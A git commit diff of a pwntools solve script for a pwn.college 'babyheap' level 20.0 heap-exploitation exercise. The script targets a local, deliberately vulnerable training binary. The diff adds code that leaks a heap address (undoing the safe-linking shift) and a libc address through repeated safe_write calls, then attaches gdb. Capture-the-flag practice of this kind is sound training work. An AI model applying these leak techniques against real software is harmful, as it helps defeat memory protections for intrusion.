987cc30bfe9b1fdef234c8ec7864dcf1765af259
curiocunngios <curiocunngios@gmail.com>
2025-03-10 19:40:26 -0400

    done 19.0

--- pwn.college/babyheap_level20.0/solve.py
+++ pwn.college/babyheap_level20.0/solve.py
@@ -1,6 +1,6 @@
 from pwn import * 
 
-binary = './babyheap_level19.0_patched'
+binary = './babyheap_level20.0_patched'
 p = process(binary)
 
 s = '''
@@ -37,13 +37,37 @@ p.sendline("malloc 2 828")
 
 
 
-# but the next chunk is still just 0x20 bytes after the previous one
-p.sendline("read_flag")
-
-
 
 # now we safe_write with 828 bytes, that's a lot, which would print the flag!
 p.sendline("safe_write 2")
+
+
+
+
+    
+    
+
+
+
+
+
+p.recvuntil(b"[*] safe_write(allocations[2])\n")
+leak_data = p.recvline()
+
+heap_addr = u64(leak_data[:8])
+heap_addr = heap_addr << 12
+
+
+print(hex(heap_addr))
+
+
+
+
+p.sendline("safe_write 2")
+
+libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+print(hex(libc_addr))
+
 
 
 gdb.attach(p, s)
